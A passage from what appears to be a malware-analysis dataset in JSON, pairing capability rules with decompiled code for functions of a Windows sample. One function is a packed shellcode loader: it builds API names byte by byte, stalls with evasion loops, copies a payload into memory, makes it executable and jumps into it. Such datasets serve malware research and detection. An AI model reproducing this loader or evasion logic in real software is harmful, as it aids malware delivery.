0;\n                }\n                else {\n                    uVar1 = uVar1 & 0xff;\n                    uVar2 = *(arg_ch + arg_10h + -7);\n                    if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -6);\n                    uVar1 = *(arg_ch + arg_10h + -6);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    uVar2 = *(arg_8h + arg_10h + -5);\n                    uVar1 = *(arg_ch + arg_10h + -5);\n                    if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                        return iVar3;\n                    }\n                    iVar3 = *(arg_8h + arg_10h + -4) - *(arg_ch + arg_10h + -4);\n                    if (iVar3 != 0) {\n                        iVar3 = (0 < iVar3) * 2 + -1;\n                    }\n                }\n                if (iVar3 != 0) {\n                    return iVar3;\n                }\ncode_r0x0044cb80:\n                uVar2 = *(arg_8h + arg_10h + -3);\n                uVar1 = *(arg_ch + arg_10h + -3);\n                if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n                    return iVar3;\n                }\n                goto code_r0x0044c7a5;\n            default:\n                goto code_r0x0044b820;\n            }\n            return 0;\n        }\n        uVar1 = *arg_8h;\n        uVar2 = *arg_ch;\n        if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar1 = *(arg_8h + 1);\n        uVar2 = *(arg_ch + 1);\n        if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar1 = *(arg_8h + 2);\n        uVar2 = *(arg_ch + 2);\n        if ((uVar1 != uVar2) && (iVar3 = (uVar1 != uVar2 && -1 < uVar1 - uVar2) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar1 = *(arg_8h + 3);\n        uVar2 = *(arg_ch + 3);\n    }\n    iVar3 = uVar1 - uVar2;\n    if (iVar3 != 0) {\n        iVar3 = (0 < iVar3) * 2 + -1;\n    }\n    return iVar3;\ncode_r0x0044b820:\n    if (*arg_8h == *arg_ch) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = *arg_8h;\n        uVar1 = *arg_ch;\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 1);\n        uVar1 = *(arg_ch + 1);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 2);\n        uVar1 = *(arg_ch + 2);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 3) - *(arg_ch + 3);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h[1] == arg_ch[1]) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = *(arg_8h + 1);\n        uVar1 = *(arg_ch + 1);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 5);\n        uVar1 = *(arg_ch + 5);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 6);\n        uVar1 = *(arg_ch + 6);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 7) - *(arg_ch + 7);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h[2] == arg_ch[2]) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = *(arg_8h + 2);\n        uVar1 = *(arg_ch + 2);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 9);\n        uVar1 = *(arg_ch + 9);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 10);\n        uVar1 = *(arg_ch + 10);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 0xb) - *(arg_ch + 0xb);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h[3] == arg_ch[3]) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = *(arg_8h + 3);\n        uVar1 = *(arg_ch + 3);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0xd);\n        uVar1 = *(arg_ch + 0xd);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0xe);\n        uVar1 = *(arg_ch + 0xe);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 0xf) - *(arg_ch + 0xf);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h[4] == arg_ch[4]) {\n        iVar3 = 0;\n    }\n    else {\n        uVar1 = *(arg_ch + 4);\n        uVar2 = *(arg_8h + 4);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x11);\n        uVar1 = *(arg_ch + 0x11);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x12);\n        uVar1 = *(arg_ch + 0x12);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 0x13) - *(arg_ch + 0x13);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h[5] == arg_ch[5]) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = *(arg_8h + 5);\n        uVar1 = *(arg_ch + 5);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x15);\n        uVar1 = *(arg_ch + 0x15);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x16);\n        uVar1 = *(arg_ch + 0x16);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 0x17) - *(arg_ch + 0x17);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h[6] == arg_ch[6]) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = *(arg_8h + 6);\n        uVar1 = *(arg_ch + 6);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x19);\n        uVar1 = *(arg_ch + 0x19);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x1a);\n        uVar1 = *(arg_ch + 0x1a);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 0x1b) - *(arg_ch + 0x1b);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    if (arg_8h[7] == arg_ch[7]) {\n        iVar3 = 0;\n    }\n    else {\n        uVar2 = *(arg_8h + 7);\n        uVar1 = *(arg_ch + 7);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x1d);\n        uVar1 = *(arg_ch + 0x1d);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        uVar2 = *(arg_8h + 0x1e);\n        uVar1 = *(arg_ch + 0x1e);\n        if ((uVar2 != uVar1) && (iVar3 = (uVar2 != uVar1 && -1 < uVar2 - uVar1) * 2 + -1,  iVar3 != 0)) {\n            return iVar3;\n        }\n        iVar3 = *(arg_8h + 0x1f) - *(arg_ch + 0x1f);\n        if (iVar3 != 0) {\n            iVar3 = (0 < iVar3) * 2 + -1;\n        }\n    }\n    if (iVar3 != 0) {\n        return iVar3;\n    }\n    arg_8h = arg_8h + 8;\n    arg_ch = arg_ch + 8;\n    arg_10h = arg_10h + -0x20;\n    goto code_r0x0044bc52;\n}\n",
        "token_count": 16526
    },
    "00401014": {
        "rules": [
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nvoid fcn.00401014(void)\n\n{\n    uint lpflOldProtect;\n    \n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(*0x4dc114, *0x4e2d24, 0x40, &lpflOldProtect);\n    return;\n}\n",
        "token_count": 62
    },
    "00445551": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00445551(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.00442509(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "0044859c": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0044859c(void)\n\n{\n    *0x459a60 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00401032": {
        "rules": [
            "contain loop",
            "set environment variable",
            "move file"
        ],
        "decompiled_code": "\nuint fcn.00401032(void)\n\n{\n    uint unaff_EBX;\n    int32_t iStack2408;\n    uint32_t uStack2400;\n    int32_t iStack2396;\n    int32_t iStack2368;\n    int32_t iStack2356;\n    int32_t iStack2352;\n    uchar auStack2348 [1028];\n    uchar auStack1320 [4];\n    uint uStack1316;\n    uint uStack1312;\n    uint uStack1308;\n    uint uStack1304;\n    uint uStack1300;\n    uint uStack1296;\n    uint uStack1292;\n    uint uStack1288;\n    uint uStack1284;\n    uint uStack1280;\n    uint uStack1276;\n    uint uStack1272;\n    uint uStack1268;\n    uint uStack1264;\n    uint uStack1260;\n    uint uStack1256;\n    uint uStack1252;\n    uint uStack1248;\n    uint uStack1244;\n    uint uStack1240;\n    uint uStack1236;\n    uint uStack1232;\n    uint uStack1228;\n    uint uStack1224;\n    uint uStack1220;\n    uint uStack1216;\n    uint uStack1212;\n    uint uStack1208;\n    uint uStack1204;\n    uint uStack1200;\n    uint uStack1196;\n    uint uStack1192;\n    uint uStack1188;\n    uint uStack1184;\n    uint uStack1180;\n    uint uStack1176;\n    uint uStack1172;\n    uint uStack1168;\n    uint uStack1164;\n    uint uStack1160;\n    uint uStack1156;\n    uint uStack1152;\n    uint uStack1148;\n    uint uStack1144;\n    uint uStack1140;\n    uint uStack1136;\n    uint uStack1132;\n    uint uStack1128;\n    uint uStack1124;\n    uint uStack1120;\n    uint uStack1116;\n    uint uStack1112;\n    uint uStack1108;\n    uint uStack1104;\n    uint uStack1100;\n    uint uStack1096;\n    uint uStack1092;\n    uint uStack1088;\n    uint uStack1084;\n    uint uStack1080;\n    uint uStack1076;\n    uint uStack1072;\n    uint uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uint uStack1056;\n    uint uStack1052;\n    uint uStack1048;\n    uint uStack1044;\n    uint uStack1040;\n    uint uStack1036;\n    uint uStack1032;\n    uint uStack1028;\n    uint uStack1024;\n    uint uStack1020;\n    uint uStack1016;\n    uint uStack1012;\n    uint uStack1008;\n    uint uStack1004;\n    uint uStack1000;\n    uint uStack996;\n    uint uStack992;\n    uint uStack988;\n    uint uStack984;\n    uint uStack980;\n    uint uStack976;\n    uint uStack972;\n    uint uStack968;\n    uint uStack964;\n    uint uStack960;\n    uint uStack956;\n    uint uStack952;\n    uint uStack948;\n    uint uStack944;\n    uint uStack940;\n    uint uStack936;\n    uint uStack932;\n    uint uStack928;\n    uint uStack924;\n    uint uStack920;\n    uint uStack916;\n    uint uStack912;\n    uint uStack908;\n    uint uStack904;\n    int32_t iStack900;\n    uint uStack896;\n    uint uStack892;\n    uint uStack888;\n    uint uStack884;\n    uint uStack880;\n    uint uStack876;\n    uint uStack872;\n    uint uStack868;\n    uint uStack864;\n    uint uStack860;\n    uint uStack856;\n    uint uStack852;\n    uint uStack848;\n    uint uStack844;\n    uint uStack840;\n    uint uStack836;\n    uint uStack832;\n    uint uStack828;\n    uint uStack824;\n    uint uStack820;\n    uint uStack816;\n    uint uStack812;\n    uint uStack808;\n    uint uStack804;\n    uint uStack800;\n    uint uStack796;\n    uint uStack792;\n    uint uStack788;\n    uint uStack784;\n    uint uStack780;\n    uint uStack776;\n    uint uStack772;\n    uint uStack768;\n    uint uStack764;\n    uint uStack760;\n    uint uStack756;\n    uint uStack752;\n    uint uStack748;\n    uint uStack744;\n    uint uStack740;\n    uint uStack736;\n    uint uStack732;\n    uint uStack728;\n    uint uStack724;\n    uint uStack720;\n    uint uStack716;\n    uint uStack712;\n    uint uStack708;\n    uint uStack704;\n    uint uStack700;\n    uint uStack696;\n    uint uStack692;\n    uint uStack688;\n    uint uStack684;\n    uint uStack680;\n    uint uStack676;\n    uint uStack672;\n    uint uStack668;\n    uint uStack664;\n    uint uStack660;\n    uint uStack656;\n    uint uStack652;\n    uint uStack648;\n    uint uStack644;\n    uint uStack640;\n    uint uStack636;\n    uint uStack632;\n    uint uStack628;\n    uint uStack624;\n    uint uStack620;\n    uint uStack616;\n    uint uStack612;\n    uint uStack608;\n    uint uStack604;\n    uint uStack600;\n    uint uStack596;\n    uint uStack592;\n    uint uStack588;\n    uint uStack584;\n    uint uStack580;\n    uint uStack576;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    if (*0x4e2d24 == 0x64d0b) {\n        fcn.0043cd0e(0x459e60, \"Zabatarilerudobor cokexunovarolox kiwuwoferivisabogidu\", unaff_EBX);\n        fcn.0043cd0e(0, 0, unaff_EBX);\n    }\n    *0x4dddec = 0x65;\n    *0x4dddf2 = 0x6c;\n    *0x4dddf0 = 0x2e;\n    *0x4dddeb = 0x6e;\n    *0x4dddee = 0x33;\n    *0x4ddde9 = 0x65;\n    *0x4ddded = 0x6c;\n    *0x4dddf1 = 100;\n    *0x4dddf3 = 0x6c;\n    *0x4dddef = 0x32;\n    *0x4dddea = 0x72;\n    *0x4ddde8 = 0x6b;\n    *0x4dddf4 = 0;\n    uStack16 = *0x4e2164;\n    *0x4df92a = 0x68;\n    *0x4df925 = 0x65;\n    *0x4df928 = 0x6f;\n    *0x4df927 = 0x6f;\n    *0x4df920 = 0x43;\n    *0x4df924 = 0x74;\n    *0x4df929 = 0x6c;\n    *0x4df92f = 0x32;\n    *0x4df92c = 0x6c;\n    *0x4df935 = 0x68;\n    *0x4df933 = 0x70;\n    *0x4df92e = 0x33;\n    *0x4df930 = 0x53;\n    *0x4df937 = 0x74;\n    *0x4df931 = 0x6e;\n    *0x4df936 = 0x6f;\n    *0x4df923 = 0x61;\n    *0x4df926 = 0x54;\n    *0x4df932 = 0x61;\n    *0x4df934 = 0x73;\n    *0x4df922 = 0x65;\n    *0x4df92d = 0x70;\n    *0x4df92b = 0x65;\n    *0x4df921 = 0x72;\n    *0x4df938 = 0;\n    *0x4dc11e = 0x33;\n    *0x4dc11a = 100;\n    *0x4dc11b = 0x75;\n    *0x4dc11f = 0x32;\n    *0x4dc122 = 0x72;\n    *0x4dc125 = 0x57;\n    *0x4dc11c = 0x6c;\n    *0x4dc120 = 0x46;\n    *0x4dc118 = 0x4d;\n    *0x4dc123 = 0x73;\n    *0x4dc124 = 0x74;\n    *0x4dc11d = 0x65;\n    *0x4dc119 = 0x6f;\n    *0x4dc121 = 0x69;\n    *0x4dc126 = 0;\n    uStack8 = 0xffffffff;\n    uStack12 = 0;\n    if (*0x4e2d24 == 0x6016e) {\n        (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(0, 0);\n        (*_sym.imp.KERNEL32.dll_EnumTimeFormatsW)(0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_GetStringTypeExA)\n                  (0, 0, \"Vixamopelito xalelibedopo secuwaja socifirufipe manefu\", 0, auStack1320);\n        (*_sym.imp.KERNEL32.dll_FormatMessageA)(0, 0, 0, 0, auStack2348, 0, 0);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(0, 0);\n        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(0, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_MoveFileWithProgressA)(\"Haromubijabi sajete\", \"Wodo seye bi pahawu rifita\", 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_Sleep)(0);\n        (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(0, 0);\n        (*_sym.imp.MSIMG32.dll_GradientFill)(0, 0, 0, 0, 0, 0);\n        fcn.0043cc7a(0);\n        fcn.0043cbfb(0, 0);\n    }\n    for (iStack2352 = 0; iStack2352 < 0x301c8ffd; iStack2352 = iStack2352 + 1) {\n        (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (0x3184bb < iStack2352) {\n            (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(0);\n        }\n        if ((0xf65b1 < iStack2352) &&\n           (((iStack2356 != 0x60051d89 || (iStack2356 >> 0x1f != 2)) && (iStack2368 != 0x66729f13)))) break;\n    }\n    fcn.00401028();\n    iStack900 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0, *0x4e2d24);\n    for (iStack2396 = 0; iStack2396 < 0x7aa767; iStack2396 = iStack2396 + 1) {\n        if (iStack2396 == 0x3f80ed) {\n            *0x4e2ec4 = *0x458a84;\n            *0x4dc114 = iStack900;\n        }\n    }\n    for (uStack2400 = 0; uStack2400 < *0x4e2d24; uStack2400 = uStack2400 + 1) {\n        *(*0x4dc114 + uStack2400) = *(*0x4e2ec4 + uStack2400 + 0x8f176);\n    }\n    fcn.00401019(0x4dc114, 0x4e2d24);\n    *0x4e5d18 = *0x4e5d18 + 0x40;\n    *0x45b090 = 0x6b;\n    *0x45b099 = 100;\n    *0x45b091 = 0x65;\n    *0x45b095 = 0x6c;\n    *0x45b097 = 0x32;\n    *0x45b09a = 0x6c;\n    *0x45b098 = 0x2e;\n    *0x45b092 = 0x72;\n    *0x45b096 = 0x33;\n    *0x45b094 = 0x65;\n    *0x45b09b = 0x6c;\n    *0x45b093 = 0x6e;\n    *0x45b09c = 0;\n    for (iStack2408 = 0; iStack2408 < 0x65353; iStack2408 = iStack2408 + 1) {\n        if (iStack2408 == 0x24779) {\n            *0x4e2164 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"kernel32.dll\");\n        }\n    }\n    *0x4e2d2a = 0x72;\n    *0x4e2d35 = 0x74;\n    *0x4e2d2d = 0x61;\n    *0x4e2d31 = 0x6f;\n    *0x4e2d33 = 0x65;\n    *0x4e2d2b = 0x74;\n    *0x4e2d29 = 0x69;\n    *0x4e2d28 = 0x56;\n    *0x4e2d30 = 0x72;\n    *0x4e2d2f = 0x50;\n    *0x4e2d2c = 0x75;\n    *0x4e2d2e = 0x6c;\n    *0x4e2d34 = 99;\n    *0x4e2d32 = 0x74;\n    *0x4e2d36 = 0;\n    fcn.00401014();\n    uStack1304 = 0x3ab1e315;\n    uStack616 = 0x11ec0f70;\n    uStack660 = 0x4cdaf16;\n    uStack808 = 0x6c5a8c6c;\n    uStack968 = 0x1dda535e;\n    uStack804 = 0x5d730d7c;\n    uStack1184 = 0x4da4ace2;\n    uStack956 = 0x41b5d805;\n    uStack648 = 0x359bbdbe;\n    uStack760 = 0x79a63980;\n    uStack1052 = 0x1cac7cb7;\n    uStack1012 = 0x6dc2e6bc;\n    uStack1176 = 0x4ebb7a2c;\n    uStack1144 = 0x3ab95aa;\n    uStack1140 = 0x46420dbc;\n    uStack1048 = 0x585e837f;\n    uStack1084 = 0x11cf6407;\n    uStack796 = 0x537eb3b6;\n    uStack792 = 0x474d7cea;\n    uStack1288 = 0x21ed2648;\n    uStack952 = 0x2fc6e1e6;\n    uStack600 = 0x56db700d;\n    uStack876 = 0x490f0a5f;\n    uStack1044 = 0x6d5c0fc0;\n    uStack596 = 0x27fe988b;\n    uStack784 = 0x75646b5f;\n    uStack916 = 0x4c5a17cb;\n    uStack1128 = 0x2e81407e;\n    uStack780 = 0x5d52b3d3;\n    uStack912 = 0x1dd42843;\n    uStack696 = 0x3ec16a7;\n    uStack1040 = 0x2d70c3bd;\n    uStack1124 = 0x2f6f18d6;\n    uStack1120 = 0x42f1e318;\n    uStack1232 = 0x5e8ca6fe;\n    uStack776 = 0x4bdd661b;\n    uStack740 = 0x37212cf4;\n    uStack1228 = 0x6672fd7c;\n    uStack1080 = 0x67282b0c;\n    uStack1224 = 0x77536d2c;\n    uStack1168 = 0x2bb6aa62;\n    uStack1076 = 0x1e2e72f2;\n    uStack1036 = 0x5ee3117b;\n    uStack684 = 0x6c4d275b;\n    uStack1220 = 0x429ac70f;\n    uStack1216 = 0x7b736a5e;\n    uStack828 = 0x4afcce45;\n    uStack824 = 0x1d13132e;\n    uStack728 = 0xf15623e;\n    uStack772 = 0x5ab478fa;\n    uStack1032 = 0x60697e96;\n    uStack588 = 0x5d76176c;\n    uStack640 = 0x58bf3d2d;\n    uStack944 = 0x190c9212;\n    uStack1212 = 0x3763000b;\n    uStack584 = 0x19e5f369;\n    uStack820 = 0x1163dbca;\n    uStack1068 = 0x556f1ea2;\n    uStack632 = 0x4b6bb0f8;\n    uStack680 = 0x3859356;\n    uStack868 = 0x1c73cef7;\n    uStack904 = 0x5993216b;\n    uStack1116 = 0x2a40277f;\n    uStack1112 = 0x33aef21e;\n    uStack864 = 0x7111fc5e;\n    uStack724 = 0x550c9878;\n    uStack996 = 0x2401805b;\n    uStack1028 = 0x62d2d24b;\n    uStack1272 = 0x361da6a1;\n    uStack768 = 0x13eabe52;\n    uStack1064 = 0x6bbe98c1;\n    uStack1108 = 0x2f915490;\n    uStack988 = 0x7d43d361;\n    uStack984 = 0x678af443;\n    uStack1204 = 0x7d8e2615;\n    uStack576 = 0x417aa32d;\n    uStack676 = 0x37b1a4f3;\n    uStack1104 = 0x1b9c577b;\n    uStack1100 = 0x9a04bf5;\n    uStack1200 = 0x65c6d12f;\n    uStack720 = 0x1a720cde;\n    uStack1024 = 0x3018910f;\n    uStack1160 = 0x781cd790;\n    uStack1260 = 0x341d0641;\n    uStack764 = 0x9bba8134;\n    uStack1060 = 0xdfd30f7a;\n    uStack860 = 0x7f9731;\n    uStack1156 = 0x58340705;\n    uStack856 = 0x9cce1e0c;\n    uStack976 = 0x2d895f9;\n    uStack1096 = 0x957dd823;\n    uStack932 = 0xfc73375f;\n    uStack1164 = 0xae594f94;\n    uStack1312 = 0x29f235d4;\n    uStack1148 = 0x16109320;\n    uStack1056 = 0xb34a0b01;\n    uStack608 = 0xe5c34f2b;\n    uStack716 = 0xf6354d03;\n    uStack1172 = 0x38d42b89;\n    uStack1248 = 0x1c138fe5;\n    uStack1300 = 0xdaeddcde;\n    uStack704 = 0x9daf8d69;\n    uStack1092 = 0x21fff8e1;\n    uStack1240 = 0xe85d0b8b;\n    uStack800 = 0x50bf23a0;\n    uStack700 = 0x3ec83927;\n    uStack1132 = 0xc6679cf7;\n    uStack1016 = 0x388a2218;\n    uStack1236 = 0x62bef5e;\n    uStack1316 = 0xf667ec0e;\n    uStack672 = 0x7081fb81;\n    uStack1004 = 0x2db05a2e;\n    uStack1308 = 0xebab93a1;\n    uStack788 = 0xa180c55b;\n    uStack884 = 0x7705e01f;\n    uStack708 = 0x3b3f576d;\n    uStack872 = 0x6389ecff;\n    uStack624 = 0xaa2ba4e6;\n    uStack1296 = 0xa3b53728;\n    uStack960 = 0x31418c32;\n    uStack948 = 0xcf8ac1c6;\n    uStack936 = 0x63133d52;\n    uStack852 = 0x103fbb33;\n    uStack652 = 0xdeb835b7;\n    uStack888 = 0x44dc8e84;\n    uStack1008 = 0x34caf9b1;\n    uStack752 = 0x1b357f5e;\n    uStack620 = 0x908e45d1;\n    uStack756 = 0x3f210c93;\n    uStack832 = 0xf9e4b2ef;\n    uStack744 = 0xba7670b6;\n    uStack1088 = 0x7d0ab579;\n    uStack656 = 0x5c031849;\n    uStack748 = 0x579e5cdc;\n    uStack940 = 0x10d788ba;\n    uStack612 = 0xe5adeedc;\n    uStack592 = 0xdb50ea16;\n    uStack964 = 0xf95cfc53;\n    uStack668 = 0xe2f68f3;\n    uStack1264 = 0x1f355f7d;\n    uStack836 = 0x2d7daa5e;\n    uStack712 = 0x98093969;\n    uStack1072 = 0x5b7f747;\n    uStack848 = 0xcc57a48d;\n    uStack924 = 0x442d5382;\n    uStack1268 = 0x93e7ceea;\n    uStack1284 = 0xdac9426d;\n    uStack1136 = 0xcb5140ec;\n    uStack732 = 0x7fb5ba5f;\n    uStack1000 = 0xe4cc5f66;\n    uStack1256 = 0x3388123a;\n    uStack1292 = 0xf6cf2e74;\n    uStack604 = 0x40ecf0f3;\n    uStack628 = 0xab04096e;\n    uStack980 = 0x54434f39;\n    uStack892 = 0x65685833;\n    uStack812 = 0xb21efcd6;\n    uStack688 = 0x2dd7ae86;\n    uStack1276 = 0xf439dfa6;\n    uStack736 = 0xe38ee7b;\n    uStack580 = 0x90db8a77;\n    uStack896 = 0x719edac9;\n    uStack908 = 0xc3380004;\n    uStack1020 = 0xc1b9422b;\n    uStack840 = 0x530e055d;\n    uStack1152 = 0x59c30d7e;\n    uStack1192 = 0x3c553e2a;\n    uStack928 = 0xb9b16ad3;\n    uStack1188 = 0x6c57d02;\n    uStack636 = 0x305c9bc5;\n    uStack920 = 0x4a32d5f3;\n    uStack1208 = 0xb5646cb;\n    uStack992 = 0x75abe51e;\n    uStack1180 = 0xe563d430;\n    uStack1244 = 0x4d9174ab;\n    uStack644 = 0x4e37bef4;\n    uStack1196 = 0x114c3cbd;\n    uStack692 = 0x4698cbaf;\n    uStack1252 = 0xefedd962;\n    uStack972 = 0x26b2f7b5;\n    uStack1280 = 0x2d3996b0;\n    uStack664 = 0xb846dfa3;\n    uStack880 = 0xa6c0fb65;\n    uStack844 = 0x34eba593;\n    uStack816 = 0x738a618c;\n    fcn.0040100a(*0x4dc114, *0x4e2d24, 0x458000);\n    *0x4dc114 = fcn.0040100f(*0x4dc114);\n    (**0x4dc114)();\n    return 0;\n}\n",
        "token_count": 6035
    },
    "0043a78b": {
        "rules": [
            "set environment variable",
            "get disk information",
            "get common file path",
            "accept command line arguments"
        ],
